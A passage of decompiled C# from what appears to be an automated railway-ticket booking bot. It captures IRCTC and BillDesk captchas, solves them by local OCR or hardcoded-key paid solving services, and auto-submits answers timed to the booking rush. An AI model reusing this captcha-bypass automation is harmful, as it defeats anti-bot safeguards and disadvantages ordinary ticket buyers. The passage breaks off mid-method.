using System;
using System.Collections.Generic;
using System.Collections.Specialized;
using System.ComponentModel;
using System.Diagnostics;
using System.Drawing;
using System.Drawing.Imaging;
using System.IO;
using System.Linq;
using System.Net;
using System.Reflection;
using System.Runtime.InteropServices;
using System.Security.Cryptography;
using System.ServiceProcess;
using System.Text;
using System.Text.RegularExpressions;
using System.Threading;
using System.Timers;
using System.Web;
using System.Windows.Forms;
using Bunifu.Framework.UI;
using Ionic.Zip;
using Microsoft.VisualBasic;
using static System.Net.Mime.MediaTypeNames;
using Application = System.Windows.Forms.Application;
using Image = System.Drawing.Image;

internal class frmCaptcha : Form
{
	private delegate string Delegate2(byte[] byte_0, int int_0);

	public static string ptth;

	private string base64inage;

	public static bool isok_;

	private object lockObject = new object();

	private string string_0;

	private clsMain class28_0;

	private Control control_0;

	internal string string_1;

	public static string pks;

	internal Bitmap bitmap_0;

	private const int int_0 = 7;

	internal Image image_0;

	internal bool bool_0 = true;

	internal string string_2 = "";

	internal string string_3 = "";

	private string string_5 = "";

	private string string_6 = "";

	private string string_7 = "";

	internal static string string_8 = "ripcaptcha.com";

	internal static string string_9 = "5da76abb77a8a0d3f7636645936a4668";

	internal string string_10;

	internal static string string_11 = "";

	internal static string string_12 = "";

	internal static string string_13 = "0";

	internal static string string_14 = "b864f1e3f4664dc7b864f1e3f4664dc7";

	private bool bool_1;

	private bool bool_2;

	internal static bool bool_3;

	private System.Timers.Timer timer_0;

	private static bool bool_4 = false;

	private IntPtr intptr_0 = IntPtr.Zero;

	private bool bool_5;

	private bool bool_6;

	private int int_2;

	private int int_3;

	private int int_4 = 5;

	internal bool bool_8;

	internal bool bool_9;

	internal bool bool_10;

	internal bool bool_11;

	private object object_0 = new object();

	private CookieContainer cookieContainer_0;

	internal DateTime dateTime_0 = DateTime.Now;

	internal DateTime dateTime_1 = DateTime.Now;

	protected static readonly int int_5 = 180;

	private static readonly IntPtr intptr_1 = new IntPtr(-1);

	private StringBuilder stringBuilder_0 = new StringBuilder(256);

	protected static readonly string string_15 = "api.cheapcaptcha.com";

	private IContainer icontainer_0;

	private LinkLabel lnkOTP;

	private Label label1;

	private PictureBox picThin;

	private Label label2;

	private PictureBox picDark;

	private Label label3;

	private Label label4;

	private PictureBox picDarkLarge;

	internal TextBox txtImageData;

	internal Label lblWrongCaptcha;

	private CheckBox chkDark;

	private CheckBox chkThin;

	private CheckBox chkDarkLarge;

	internal PictureBox picOriginal;

	private Panel pnlCaptcha;

	private BunifuImageButton btnCancel;

	public BunifuImageButton btnReferesh;

	private Panel pnlHeader;

	public Label lblTime;

	public System.Windows.Forms.Timer timer_1;

	public Button btnSubmit;

	private BunifuElipse bunifuElipse_0;

	internal Label tktname;

	private IContainer components;

	[DllImport("kernel32.dll")]
	internal static extern void un(uint uint_0);

	protected static NameValueCollection smethod_0(string string_16)
	{
		NameValueCollection nameValueCollection = new NameValueCollection();
		if (string_16.Contains("?"))
		{
			string_16 = string_16.Substring(string_16.IndexOf('?') + 1);
		}
		string[] array = Regex.Split(string_16, "&");
		for (int i = 0; i < array.Length; i++)
		{
			string[] array2 = Regex.Split(array[i], "=");
			if (array2.Length == 2)
			{
				nameValueCollection.Add(array2[0], array2[1]);
			}
			else
			{
				nameValueCollection.Add(array2[0], string.Empty);
			}
		}
		return nameValueCollection;
	}

	protected static NameValueCollection smethod_1(string string_16, string string_17)
	{
		HttpWebRequest httpWebRequest = (HttpWebRequest)WebRequest.Create("http://" + string_15 + "/api/user");
		httpWebRequest.Method = "POST";
		httpWebRequest.ContentType = "application/x-www-form-urlencoded";
		using (StreamWriter streamWriter = new StreamWriter(httpWebRequest.GetRequestStream()))
		{
			streamWriter.Write("username=" + string_16 + "&password=" + string_17);
		}
		HttpWebResponse httpWebResponse = (HttpWebResponse)httpWebRequest.GetResponse();
		StreamReader streamReader = new StreamReader(httpWebResponse.GetResponseStream(), Encoding.UTF8);
		string string_18 = streamReader.ReadToEnd();
		httpWebResponse.Close();
		streamReader.Close();
		return smethod_0(string_18);
	}

	protected static NameValueCollection smethod_2(string string_16, string string_17, string string_18)
	{
		HttpWebRequest httpWebRequest = (HttpWebRequest)WebRequest.Create("http://" + string_15 + "/api/captcha/" + string_18 + "/report");
		httpWebRequest.Method = "POST";
		httpWebRequest.ContentType = "application/x-www-form-urlencoded";
		using (StreamWriter streamWriter = new StreamWriter(httpWebRequest.GetRequestStream()))
		{
			streamWriter.Write("username=" + string_16 + "&password=" + string_17);
		}
		HttpWebResponse httpWebResponse = (HttpWebResponse)httpWebRequest.GetResponse();
		StreamReader streamReader = new StreamReader(httpWebResponse.GetResponseStream(), Encoding.UTF8);
		string string_19 = streamReader.ReadToEnd();
		httpWebResponse.Close();
		streamReader.Close();
		return smethod_0(string_19);
	}

	protected static NameValueCollection smethod_3(string string_16)
	{
		HttpWebRequest httpWebRequest = (HttpWebRequest)WebRequest.Create("http://" + string_15 + "/api/captcha/" + string_16);
		httpWebRequest.Method = "GET";
		HttpWebResponse httpWebResponse = (HttpWebResponse)httpWebRequest.GetResponse();
		StreamReader streamReader = new StreamReader(httpWebResponse.GetResponseStream(), Encoding.UTF8);
		string string_17 = streamReader.ReadToEnd();
		httpWebResponse.Close();
		streamReader.Close();
		return smethod_0(string_17);
	}

	protected static NameValueCollection smethod_4(string string_16, string string_17, byte[] byte_0)
	{
		string requestUriString = "http://" + string_15 + "/api/captcha";
		string text = DateTime.Now.Ticks.ToString("x");
		HttpWebRequest httpWebRequest = (HttpWebRequest)WebRequest.Create(requestUriString);
		httpWebRequest.ContentType = "multipart/form-data; boundary=" + text;
		httpWebRequest.Method = "POST";
		httpWebRequest.KeepAlive = true;
		using (BinaryWriter binaryWriter = new BinaryWriter(httpWebRequest.GetRequestStream()))
		{
			int num = byte_0.Length;
			string value = string.Format("\r\n--{0}\r\nContent-Disposition: form-data; name=\"username\"\r\n\r\n{1}\r\n--{0}\r\nContent-Disposition: form-data; name=\"password\"\r\n\r\n{2}\r\n--{0}\r\nContent-Disposition: form-data; name=\"captchafile\"; filename=\"image.jpg\"\r\nContent-Type: image/jpeg\r\nContent-Length: {3}\r\n\r\n", text, string_16, string_17, num);
			binaryWriter.Write(value);
			binaryWriter.Write(byte_0);
			binaryWriter.Write("\r\n--" + text + "--");
		}
		HttpWebResponse httpWebResponse = (HttpWebResponse)httpWebRequest.GetResponse();
		StreamReader streamReader = new StreamReader(httpWebResponse.GetResponseStream(), Encoding.UTF8);
		string text2 = streamReader.ReadToEnd();
		httpWebResponse.Close();
		streamReader.Close();
		Console.WriteLine(text2);
		return smethod_0(text2);
	}

	[DllImport("user32.dll")]
	[return: MarshalAs(UnmanagedType.Bool)]
	internal static extern bool SetWindowPos(IntPtr intptr_5, IntPtr intptr_6, int int_6, int int_7, int int_8, int int_9, uint uint_3);

	[DllImport("user32.dll", CharSet = CharSet.Auto)]
	internal static extern IntPtr GetFocus();

	[DllImport("user32.dll", CharSet = CharSet.Auto)]
	private static extern IntPtr GetForegroundWindow();

	[DllImport("user32.dll", CharSet = CharSet.Auto)]
	private static extern bool SetForegroundWindow(IntPtr intptr_5);

	[DllImport("user32.dll", SetLastError = true)]
	private static extern IntPtr SetParent(IntPtr intptr_5, IntPtr intptr_6);

	[DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
	private static extern int GetClassName(IntPtr intptr_5, StringBuilder stringBuilder_1, int int_6);

	internal frmCaptcha(clsMain class28_1)
	{
		InitializeComponent();
		class28_0 = class28_1;
		string text = (string_7 = "");
		base.Name = "frmCaptcha-" + Thread.CurrentThread.Name;
	}

	internal frmCaptcha(clsMain class28_1, CookieContainer cookieContainer_1, string string_16, string string_17)
	{
		InitializeComponent();
		Control.CheckForIllegalCrossThreadCalls = false;
		string_5 = string_16;
		cookieContainer_0 = cookieContainer_1;
		string_6 = string_17;
		class28_0 = class28_1;
		string text = (string_7 = "");
		tktname.Text = class28_0.TktName_;
		if (string_5.Contains("billdesk.com"))
		{
			txtImageData.CharacterCasing = CharacterCasing.Normal;
		}
	}

	private void method_0()
	{
		txtImageData.Text = "";
		txtImageData.Focus();
		int_3 = 0;
		bool.TryParse(Environment.GetEnvironmentVariable("AutofillCp", EnvironmentVariableTarget.Process), out clsMain.bool_16);
		bool.TryParse(Environment.GetEnvironmentVariable("AutoSubmitCp", EnvironmentVariableTarget.Process), out clsMain.bool_17);
	}

	internal void method_2(Control control_1, Rectangle rectangle_0, string string_16)
	{
		try
		{
			string_0 = string_16;
			base64inage = string_16;
			method_4(control_1, rectangle_0);
			class28_0.Lock("ShowForm");
			if (bool_9 || bool_8)
			{
				lblTime.Visible = true;
				timer_1.Enabled = true;
			}
			if (lblWrongCaptcha.Text.Contains("AFTER PAYMENT"))
			{
				BackColor = Color.MediumAquamarine;
			}
			if (rectangle_0.Width < 280)
			{
				label2.Visible = false;
				chkThin.Visible = false;
				picThin.Visible = false;
				label4.Visible = false;
				chkDarkLarge.Visible = false;
				picDarkLarge.Visible = false;
				label3.Visible = false;
				chkDark.Visible = false;
				picDark.Visible = false;
				if (!clsMain.bool_18)
				{
					int num = rectangle_0.Height;
				}
			}
			if (lblWrongCaptcha.Text.Contains("BOI"))
			{
				picOriginal.Width = rectangle_0.Width - 5;
				picOriginal.Left = 1;
			}
		}
		catch (Exception ex)
		{
			class28_0.Lock("ShowForm err=" + ex.Message);
		}
		try
		{
			if (class28_0.isAPP)
			{
				BackColor = Color.Turquoise;
			}
			else
			{
				BackColor = SystemColors.Control;
			}
			if (class28_0.isFinalCaptcha)
			{
				bitmap_0 = new Bitmap(method_7(string_0));
				method_3();
				SetWindowPos(base.Handle, intptr_1, 0, 0, 0, 0, 3u);
				method_6(null);
				btnSubmit.Enabled = true;
				btnSubmit.Text = "Submit";
				ShowDialog();
			}
			else
			{
				bitmap_0 = new Bitmap(method_7(string_0));
				method_3();
				SetWindowPos(base.Handle, intptr_1, 0, 0, 0, 0, 3u);
				btnReferesh_Click(null, null);
				btnSubmit.Enabled = true;
				btnSubmit.Text = "Submit";
				ShowDialog();
			}
		}
		catch (ThreadAbortException)
		{
			Thread.ResetAbort();
		}
		catch
		{
		}
	}

    internal void method_2_Disha(Control control_1, Rectangle rectangle_0, string string_16)
    {
        try
        {
            string_0 = string_16;
            base64inage = string_16;
            method_4(control_1, rectangle_0);
            class28_0.Lock("ShowForm");
            if (bool_9 || bool_8)
            {
                lblTime.Visible = true;
                timer_1.Enabled = true;
            }
            if (lblWrongCaptcha.Text.Contains("AFTER PAYMENT"))
            {
                BackColor = Color.MediumAquamarine;
            }
            if (rectangle_0.Width < 280)
            {
                label2.Visible = false;
                chkThin.Visible = false;
                picThin.Visible = false;
                label4.Visible = false;
                chkDarkLarge.Visible = false;
                picDarkLarge.Visible = false;
                label3.Visible = false;
                chkDark.Visible = false;
                picDark.Visible = false;
                if (!clsMain.bool_18)
                {
                    int num = rectangle_0.Height;
                }
            }
            if (lblWrongCaptcha.Text.Contains("BOI"))
            {
                picOriginal.Width = rectangle_0.Width - 5;
                picOriginal.Left = 1;
            }
        }
        catch (Exception ex)
        {
            class28_0.Lock("ShowForm err=" + ex.Message);
        }
        try
        {
            if (class28_0.isAPP)
            {
                BackColor = Color.White;
            }
            else
            {
                BackColor = Color.Transparent;
            }
            if (class28_0.isFinalCaptcha)
            {
                bitmap_0 = new Bitmap(method_7(string_0));
                method_3();
                SetWindowPos(base.Handle, intptr_1, 0, 0, 0, 0, 3u);
                method_6(null);
                btnSubmit.Enabled = true;
                btnSubmit.Text = "Submit";
                ShowDialog();
            }
            else
            {
                bitmap_0 = new Bitmap(method_7(string_0));
                method_3();
                SetWindowPos(base.Handle, intptr_1, 0, 0, 0, 0, 3u);
                btnReferesh_Click(null, null);
                btnSubmit.Enabled = true;
                btnSubmit.Text = "Submit";
                ShowDialog();
            }
        }
        catch (ThreadAbortException)
        {
            Thread.ResetAbort();
        }
        catch
        {
        }
    }

    private void method_3()
	{
		try
		{
			intptr_0 = GetForegroundWindow();
			if (intptr_0 != IntPtr.Zero)
			{
				GetClassName(intptr_0, stringBuilder_0, stringBuilder_0.Capacity);
				control_0 = Control.FromHandle(intptr_0);
			}
		}
		catch
		{
			intptr_0 = IntPtr.Zero;
		}
	}

	internal void method_4(Control control_1, Rectangle rectangle_0)
	{
		Control control = control_1.Controls[0];
		Control control2 = control_1.Parent;
		base.Width = rectangle_0.Width;
		base.StartPosition = FormStartPosition.Manual;
		base.Location = control2.Location;
		base.Left += 2;
		base.Height += -6;
		base.TopMost = true;
	}

	internal void method_5(Control control_1, Rectangle rectangle_0, string string_16, string string_17, string string_18)
	{
		try
		{
			method_4(control_1, rectangle_0);
			string_3 = string_17;
			label1.Visible = false;
			label2.Visible = false;
			label3.Visible = false;
			label4.Visible = false;
			picOriginal.Visible = false;
			picDark.Visible = false;
			picDarkLarge.Visible = false;
			picThin.Visible = false;
			chkDark.Visible = false;
			chkDarkLarge.Visible = false;
			chkThin.Visible = false;
			lblWrongCaptcha.Text = string_18;
			int num = rectangle_0.Height;
			btnReferesh.Visible = false;
			if (string_17.Length > 0)
			{
				lnkOTP.Left = txtImageData.Left;
				lnkOTP.Top = txtImageData.Top + txtImageData.Height + 5;
				lnkOTP.Visible = true;
				lnkOTP_LinkClicked(null, null);
			}
			bool_1 = true;
			SetWindowPos(base.Handle, intptr_1, 0, 0, 0, 0, 3u);
			ShowDialog();
		}
		catch (ThreadAbortException)
		{
			Thread.ResetAbort();
		}
		catch
		{
		}
	}

	private void btnReferesh_Click(object sender, EventArgs e)
	{
		try
		{
			string_1 = null;
			bitmap_0 = null;
			Thread thread = new Thread(method_6);
			thread.IsBackground = true;
			thread.Start(0);
		}
		catch
		{
		}
	}

	private void method_6(object object_1)
	{
		bool bool_ = false;
		WebException webException_ = null;
		string text = "";
		int num = 10000;
		if ((DateTime.Now.Hour == 10 && DateTime.Now.Minute > 50) || DateTime.Now.Hour >= 11)
		{
			num = 80000;
		}
		int_3++;
		if (int_3 <= 5)
		{
			if (int_3 > 1)
			{
				num = 15000;
				if (DateTime.Now.Hour == 11)
				{
					num = 80000;
				}
			}
			try
			{
				clsMain clsMain2 = class28_0;
				string[] array = new string[8] { "Loading Captcha in LoadImage _ AutoCaptIssue: ", null, null, null, null, null, null, null };
				int num2 = 1;
				array[num2] = string_5.ToUpper().Contains("IRCTC").ToString();
				array[2] = "  isAutoFillCaptcha=";
				array[3] = bool_6.ToString();
				array[4] = "  serviceType=";
				array[5] = string_13;
				array[6] = "   Hour=";
				array[7] = DateTime.Now.Hour.ToString();
				clsMain2.Lock(string.Concat(array));
				text = "";
				DateTime dateTime_ = DateTime.Now.AddMilliseconds(400.0);
				int int_ = 0;
				Application.DoEvents();
				Bitmap bitmap;
				if (class28_0.LoginType == "NGET")
				{
					if (string_5 == "")
					{
						return;
					}
					bitmap = class28_0.method_101(string_5, string_6, class28_0.webProxy_2, ref cookieContainer_0, true, num * int_3, ref bool_, ref webException_, ref text, ref dateTime_, ref int_);
				}
				else if (class28_0.LoginType == "WEB")
				{
					if (string_0 == null)
					{
						class28_0.method_81(this);
					}
					bitmap = new Bitmap(method_7(string_0));
				}
				else if (class28_0.LoginType == "APP")
				{
					if (string_0 == null)
					{
						class28_0.method_82(this);
					}
					bitmap = new Bitmap(method_7(string_0));
				}
				else
				{
					if (string_5 == "")
					{
						return;
					}
					bitmap = class28_0.method_101(string_5, string_6, class28_0.webProxy_2, ref cookieContainer_0, true, num * int_3, ref bool_, ref webException_, ref text, ref dateTime_, ref int_);
				}
				try
				{
					picOriginal.Width = base.Width - 4;
					picOriginal.BackColor = Color.FromArgb(4, 65, 76);
					picOriginal.Image = bitmap;
					if (bitmap.Height == 20 && bitmap.Width == 308)
					{
						picOriginal.Size = new Size(517, 45);
						picOriginal.Left = -280;
					}
					picOriginal.SizeMode = PictureBoxSizeMode.StretchImage;
					picOriginal.Refresh();
					class28_0.Lock("Captcha Received =" + string_0);
					dateTime_1 = dateTime_;
					btnReferesh.Enabled = true;
				}
				catch
				{
				}
				try
				{
					if (bitmap != null)
					{
						class28_0.Lock("isFss=" + bool_8 + ",  BtecPath=" + string_7 + ",  fssHitCount=" + int_2);
						if (string_5.Contains("billdesk.com"))
						{
							if (!method_8(bitmap))
							{
								Bitmap bitmap2 = bitmap.Clone(new Rectangle(0, 0, bitmap.Width, bitmap.Height), bitmap.PixelFormat);
								byte[] byte_;
								using (MemoryStream memoryStream = new MemoryStream())
								{
									bitmap2.Save(memoryStream, ImageFormat.Bmp);
									byte_ = memoryStream.ToArray();
								}
								method_20(byte_, 5);
							}
						}
						else
						{
							method_0();
							Bitmap bitmap3 = (Bitmap)bitmap.Clone();
							string object_2 = "";
							lock (lockObject)
							{
								object_2 = SolveCaptcha(base64inage);
							}
							method_27(object_2);
							class28_0.Lock("Inside IRCTC OCR auto captcha");
							int_2++;
							DateTime now = DateTime.Now;
						}
					}
				}
				catch (Exception ex)
				{
					if (ex.Message.Contains("cannot find the file") && !bool_4)
					{
						bool_4 = true;
						MessageBox.Show(ex.Message, "OCR", MessageBoxButtons.OK, MessageBoxIcon.Exclamation);
					}
				}
			}
			catch
			{
			}
		}
		if (clsMain.bool_17)
		{
			if (!class28_0.isFinalCaptcha)
			{
				Thread.Sleep(1500);
			}
			btnSubmit_Click(this, null);
		}
		bitmap_0 = null;
	}

	internal Image method_7(string string_16)
	{
		byte[] array = Convert.FromBase64String(string_16);
		using (MemoryStream stream = new MemoryStream(array, 0, array.Length))
		{
			return Image.FromStream(stream, true);
		}
	}

	private bool method_8(Bitmap bitmap_1)
	{
		if (string_7.Length >= 5)
		{
			try
			{
				if (File.GetLastWriteTime(string_7).Year < 2017)
				{
					return false;
				}
				string text = Path.Combine(string_7, "tmp");
				if (!Directory.Exists(text))
				{
					Directory.CreateDirectory(text);
				}
				int int_ = 0;
				bool bool_ = false;
				WebException webException_ = null;
				string string_ = "";
				DateTime dateTime_ = DateTime.Now;
				List<string> list = new List<string>();
				list.Add(text);
				Bitmap bitmap = bitmap_1.Clone(new Rectangle(0, 0, bitmap_1.Width, bitmap_1.Height), bitmap_1.PixelFormat);
				int num = 17;
				Random random = new Random();
				for (int i = 1; i <= num; i++)
				{
					if (bitmap != null)
					{
						class28_0.Lock("BOI,  HitCount=" + i);
						Bitmap bitmap2 = method_19(bitmap);
						string text2 = "bill" + DateTime.Now.ToString("ddMMyyhhmmssfff") + i + random.Next(1, 5000) + ".jpg";
						bitmap2.Save(Path.Combine(text, text2));
						list.Add(text2);
					}
					if (i >= num)
					{
						break;
					}
					bitmap = class28_0.method_101(string_5, string_6, class28_0.webProxy_2, ref cookieContainer_0, true, 5000, ref bool_, ref webException_, ref string_, ref dateTime_, ref int_);
				}
				if (list.Count > 1)
				{
					Process process = new Process();
					process.StartInfo.FileName = Path.Combine(string_7, "Btec.exe");
					string text3 = string.Join("|", list.ToArray());
					process.StartInfo.Arguments = "\"" + text3 + "\"";
					process.StartInfo.CreateNoWindow = true;
					process.StartInfo.UseShellExecute = false;
					process.StartInfo.RedirectStandardOutput = true;
					process.Start();
					try
					{
						StreamReader standardOutput = process.StandardOutput;
						process.WaitForExit(3500);
						string text4 = standardOutput.ReadLine();
						if (string.IsNullOrEmpty(text4))
						{
							text4 = " ";
						}
						class28_0.Lock("OCR Output: " + text4);
						if (!process.HasExited)
						{
							process.Kill();
						}
						if (text4.Length >= 6)
						{
							string[] array = text4.Split(new string[1] { "||" }, StringSplitOptions.RemoveEmptyEntries);
							string text5 = "";
							Dictionary<char, int> dictionary = new Dictionary<char, int>();
							for (int j = 0; j < 6; j++)
							{
								string[] array2 = array;
								string[] array3 = array2;
								foreach (string text6 in array3)
								{
									if (dictionary.ContainsKey(text6[j]))
									{
										dictionary[text6[j]]++;
									}
									else
									{
										dictionary.Add(text6[j], 1);
									}
								}
								char c = ' ';
								int num2 = 0;
								foreach (char key in dictionary.Keys)
								{
									if (dictionary[key] > num2)
									{
										c = key;
										num2 = dictionary[key];
									}
								}
								text5 += c.ToString().Trim();
								dictionary.Clear();
							}
							if (text5.Length == 6)
							{
								txtImageData.Text = text5;
								btnSubmit.PerformClick();
								return true;
							}
						}
					}
					catch
					{
					}
				}
			}
			catch
			{
			}
			return false;
		}
		return false;
	}

	private void btnSubmit_Click(object sender, EventArgs e)
	{
		if (!string.IsNullOrEmpty(txtImageData.Text.Trim()) && txtImageData.Text.Trim().Length >= 2)
		{
			bool_5 = true;
			btnSubmit.Enabled = false;
			btnSubmit.Text = "Submitting...";
			base.DialogResult = DialogResult.OK;
			Close();
		}
	}

	private void method_12()
	{
		base.DialogResult = DialogResult.Cancel;
		Close();
	}

	internal Bitmap method_15(Bitmap bitmap_1, int int_6, int int_7)
	{
		Bitmap bitmap = new Bitmap(int_6, int_7, bitmap_1.PixelFormat);
		double num = (double)bitmap_1.Width / (double)int_6;
		double num2 = (double)bitmap_1.Height / (double)int_7;
		Color color = default(Color);
		Color color2 = default(Color);
		Color color3 = default(Color);
		Color color4 = default(Color);
		for (int i = 0; i < bitmap.Width; i++)
		{
			for (int j = 0; j < bitmap.Height; j++)
			{
				int num3 = (int)Math.Floor((double)i * num);
				int num4 = (int)Math.Floor((double)j * num2);
				int num5 = num3 + 1;
				if (num5 >= bitmap_1.Width)
				{
					num5 = num3;
				}
				int num6 = num4 + 1;
				if (num6 >= bitmap_1.Height)
				{
					num6 = num4;
				}
				double num7 = (double)i * num - (double)num3;
				double num8 = (double)j * num2 - (double)num4;
				double num9 = 1.0 - num7;
				double num10 = 1.0 - num8;
				color = bitmap_1.GetPixel(num3, num4);
				color2 = bitmap_1.GetPixel(num5, num4);
				color3 = bitmap_1.GetPixel(num3, num6);
				color4 = bitmap_1.GetPixel(num5, num6);
				byte b = (byte)(num9 * (double)(int)color.B + num7 * (double)(int)color2.B);
				byte b2 = (byte)(num9 * (double)(int)color3.B + num7 * (double)(int)color4.B);
				byte blue = (byte)(num10 * (double)(int)b + num8 * (double)(int)b2);
				b = (byte)(num9 * (double)(int)color.G + num7 * (double)(int)color2.G);
				b2 = (byte)(num9 * (double)(int)color3.G + num7 * (double)(int)color4.G);
				byte green = (byte)(num10 * (double)(int)b + num8 * (double)(int)b2);
				b = (byte)(num9 * (double)(int)color.R + num7 * (double)(int)color2.R);
				b2 = (byte)(num9 * (double)(int)color3.R + num7 * (double)(int)color4.R);
				byte red = (byte)(num10 * (double)(int)b + num8 * (double)(int)b2);
				bitmap.SetPixel(i, j, Color.FromArgb(255, red, green, blue));
			}
		}
		bitmap = method_16(bitmap);
		return method_17(bitmap);
	}

	internal Bitmap method_16(Bitmap bitmap_1)
	{
		Bitmap bitmap = (Bitmap)bitmap_1.Clone();
		for (int i = 0; i < bitmap.Width; i++)
		{
			for (int j = 0; j < bitmap.Height; j++)
			{
				Color pixel = bitmap.GetPixel(i, j);
				byte b = (byte)(0.299 * (double)(int)pixel.R + 0.587 * (double)(int)pixel.G + 0.114 * (double)(int)pixel.B);
				bitmap.SetPixel(i, j, Color.FromArgb(b, b, b));
			}
		}
		return (Bitmap)bitmap.Clone();
	}

	internal Bitmap method_17(Bitmap bitmap_1)
	{
		for (int i = 0; i < bitmap_1.Width; i++)
		{
			for (int j = 0; j < bitmap_1.Height; j++)
			{
				Color pixel = bitmap_1.GetPixel(i, j);
				if (pixel.R < 162 && pixel.G < 162 && pixel.B < 162)
				{
					bitmap_1.SetPixel(i, j, Color.Black);
				}
			}
		}
		for (int k = 0; k < bitmap_1.Width; k++)
		{
			for (int l = 0; l < bitmap_1.Height; l++)
			{
				Color pixel2 = bitmap_1.GetPixel(k, l);
				if (pixel2.R > 162 && pixel2.G > 162 && pixel2.B > 162)
				{
					bitmap_1.SetPixel(k, l, Color.White);
				}
			}
		}
		return bitmap_1;
	}

	internal Bitmap method_18(Bitmap bitmap_1)
	{
		for (int i = 0; i < bitmap_1.Width; i++)
		{
			for (int j = 0; j < bitmap_1.Height; j++)
			{
				Color pixel = bitmap_1.GetPixel(i, j);
				if (pixel.R < 162 && pixel.G < 162 && pixel.B < 162)
				{
					bitmap_1.SetPixel(i, j, Color.Black);
				}
			}
		}
		for (int k = 0; k < bitmap_1.Width; k++)
		{
			for (int l = 0; l < bitmap_1.Height; l++)
			{
				Color pixel2 = bitmap_1.GetPixel(k, l);
				if (pixel2.R > 162 && pixel2.G > 162 && pixel2.B > 162)
				{
					bitmap_1.SetPixel(k, l, Color.White);
				}
			}
		}
		return bitmap_1;
	}

	private Bitmap method_19(Bitmap bitmap_1)
	{
		Color color = Color.FromArgb(255, Color.Black);
		Color color2 = Color.FromArgb(255, Color.White);
		Bitmap bitmap = new Bitmap(bitmap_1.Width, bitmap_1.Height);
		for (int i = 0; i < bitmap_1.Width; i++)
		{
			for (int j = 0; j < bitmap_1.Height; j++)
			{
				Color pixel = bitmap_1.GetPixel(i, j);
				if (pixel.R <= 220 && pixel.G <= 220 && pixel.B <= 220)
				{
					if (pixel.R <= 80 && pixel.G <= 80 && pixel.B <= 80)
					{
						bitmap.SetPixel(i, j, pixel);
					}
					else
					{
						bitmap.SetPixel(i, j, color2);
					}
				}
				else
				{
					bitmap.SetPixel(i, j, color);
				}
			}
		}
		Bitmap bitmap2 = (Bitmap)bitmap.Clone();
		return method_15(bitmap2, bitmap2.Width * 2, bitmap2.Height * 2);
	}

	private void frmCaptcha_Shown(object sender, EventArgs e)
	{
		try
		{
			if (intptr_0 != IntPtr.Zero && stringBuilder_0 != null && stringBuilder_0.ToString().ToUpper().Contains("WINDOWSFORMS10.WINDOW."))
			{
				SetForegroundWindow(intptr_0);
			}
		}
		catch
		{
		}
	}

	private void chkThin_CheckedChanged(object sender, EventArgs e)
	{
		picThin.Visible = chkThin.Checked;
	}

	private void chkDarkLarge_CheckedChanged(object sender, EventArgs e)
	{
		picDarkLarge.Visible = chkDarkLarge.Checked;
	}

	private void chkDark_CheckedChanged(object sender, EventArgs e)
	{
		picDark.Visible = chkDark.Checked;
	}

	private void method_20(byte[] byte_0, int int_6)
	{
		if (!clsMain.bool_46 || string.IsNullOrEmpty(clsMain.string_46))
		{
			string_13 = "0";
		}
		int_4 = int_6;
		class28_0.Lock("GetCaptcha  serviceType=" + string_13 + "  strAutoCaptchaService=" + clsMain.string_46);
		try
		{
			string text = string_13;
			string text2 = "0";
			string text3;
			if (text != text2)
			{
				ThreadPool.QueueUserWorkItem(method_21, byte_0);
			}
			else if (((DateTime.Now.Hour == 7 && DateTime.Now.Minute > 53) || (DateTime.Now.Hour == 8 && DateTime.Now.Minute < 6) || (DateTime.Now.Hour == 9 && DateTime.Now.Minute > 53) || (DateTime.Now.Hour == 10 && DateTime.Now.Minute < 6) || (DateTime.Now.Hour == 10 && DateTime.Now.Minute > 53) || (DateTime.Now.Hour == 11 && DateTime.Now.Minute < 6)) && (text3 = string_13) != null && text3 == "0")
			{
				ThreadPool.QueueUserWorkItem(method_21, byte_0);
			}
		}
		catch (Exception ex)
		{
			class28_0.Lock("GetCaptcha ERR=" + ex.Message);
		}
	}

	private void method_21(object object_1)
	{
		try
		{
			byte[] array = (byte[])object_1;
			string text;
			if ((text = string_13) != null)
			{
				switch (text)
				{
				case "5":
				{
					byte[] byte_ = array;
					int int_ = int_4;
					method_26(byte_, int_);
					break;
				}
				case "4":
					method_23(array, int_4);
					break;
				case "3":
					method_29(array, int_4);
					break;
				case "2":
					method_22(array, int_4);
					break;
				case "1":
					method_24(array, int_4);
					break;
				case "0":
					method_22(array, int_4);
					break;
				}
			}
		}
		catch
		{
		}
	}

	internal string method_22(byte[] byte_0, int int_6)
	{
		string text = "";
		int num = 5;
		bool flag = false;
		bool flag2 = false;
		bool flag3 = false;
		bool flag4 = false;
		bool flag5 = false;
		string text2 = string_9;
		class28_0.Lock("Inside Rip_captcha");
		try
		{
			method_28(true);
			NameValueCollection nameValueCollection = new NameValueCollection
			{
				{ "key", text2 },
				{ "method", "base64" },
				{ "soft_id", "701" },
				{
					"body",
					Convert.ToBase64String(byte_0)
				}
			};
			if (num > 0)
			{
				nameValueCollection.Add("min_len", num.ToString());
			}
			if (int_6 > 0)
			{
				nameValueCollection.Add("max_len", int_6.ToString());
			}
			if (flag)
			{
				nameValueCollection.Add("numeric", "1");
			}
			if (flag2)
			{
				nameValueCollection.Add("phrase", "1");
			}
			if (flag3)
			{
				nameValueCollection.Add("regsense", "1");
			}
			if (flag4)
			{
				nameValueCollection.Add("calc", "1");
			}
			if (flag5)
			{
				nameValueCollection.Add("is_russian", "1");
			}
			using (WebClient webClient = new WebClient())
			{
				webClient.Proxy = null;
				for (int i = 0; i < 7; i++)
				{
					text = Encoding.UTF8.GetString(webClient.UploadValues("http://" + string_8 + "/in.php", nameValueCollection));
					if (!text.Contains("OK|"))
					{
						if (text.Contains("ERROR_NO_SLOT_AVAILABLE"))
						{
							Thread.Sleep(1800);
							continue;
						}
						if (text.Contains("ERROR_"))
						{
							return text;
						}
						if (!text.Contains("OK|"))
						{
							return "UNKNOWN_ERROR: " + text;
						}
						continue;
					}
					class28_0.Lock("Rip_captcha Submit Result: " + text);
					if (text.Contains("ERROR_"))
					{
						return text;
					}
					string text3 = (string_10 = text.Replace("OK|", "").Trim());
					for (int j = 0; j < 14; j++)
					{
						Thread.Sleep(1800);
						text = webClient.DownloadString("http://" + string_8 + "/res.php?key=" + text2 + "&action=get&id=" + text3);
						if (text.Contains("ERROR_NO_SLOT_AVAILABLE"))
						{
							continue;
						}
						if (text.Contains("ERROR_"))
						{
							class28_0.Lock("Rip_captcha Error: " + text.ToUpper().Trim());
							return text;
						}
						if (text.Contains("OK|"))
						{
							class28_0.Lock("Rip_captcha received: " + text.ToUpper().Trim());
							string text4 = text.ToUpper().Trim().Replace("OK|", "");
